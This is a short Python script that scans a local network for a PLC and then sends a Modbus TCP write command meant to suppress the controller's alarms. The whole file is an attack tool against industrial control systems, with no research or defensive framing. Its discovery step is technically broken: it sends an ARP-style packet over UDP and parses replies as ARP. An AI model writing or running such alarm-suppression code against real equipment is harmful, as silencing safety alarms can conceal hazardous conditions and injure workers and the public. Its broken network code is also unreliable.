import socket
import struct
import sys
import time

# Function to discover the PLC's IP address on the network
def discover_plc_ip():
    # Broadcast ARP request to discover devices on the network
    try:
        # Replace '192.168.1.255' with your network's broadcast address
        broadcast_address = '192.168.1.255'
        arp_request = b'\x00\x01\x08\x00\x06\x04\x00\x01' + b'\x00' * 6 + b'\xff' * 6 + b'\x00' * 4

        # Send ARP request
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.sendto(arp_request, (broadcast_address, 9))

        # Receive responses and identify the PLC
        s.settimeout(2)
        while True:
            response, _ = s.recvfrom(1024)
            ip_address = socket.inet_ntoa(response[28:32])
            mac_address = ':'.join(f'{b:02x}' for b in response[22:28])
            print(f"Discovered IP: {ip_address}, MAC: {mac_address}")

            # Check if the device is the PLC (replace with PLC's MAC or other identifier)
            if mac_address == '00:1A:2B:3C:4D:5E':  # Replace with your PLC's MAC address
                s.close()
                return ip_address
    except Exception as e:
        print(f"Error discovering PLC IP: {e}")
        sys.exit(1)

# Function to suppress alarms on the PLC
def suppress_alarms(plc_ip):
    try:
        # Connect to the PLC (replace with the actual protocol and port)
        plc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plc_socket.connect((plc_ip, 502))  # Modbus TCP port (replace as needed)
        print(f"Connected to PLC at {plc_ip}")

        # Example: Modify alarm flags in memory (specific to the PLC protocol)
        # This is a conceptual example and will vary based on the PLC's protocol
        suppress_command = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x01\x00\x00'  # Example Modbus command
        plc_socket.send(suppress_command)
        response = plc_socket.recv(1024)
        print(f"Alarm suppression command sent. Response: {response}")

        # Close the connection
        plc_socket.close()
        print("Alarm suppression completed.")
    except Exception as e:
        print(f"Error suppressing alarms: {e}")

# Main function
if __name__ == "__main__":
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    print(f"PLC IP address discovered: {plc_ip}")

    # Step 2: Suppress alarms on the PLC
    suppress_alarms(plc_ip)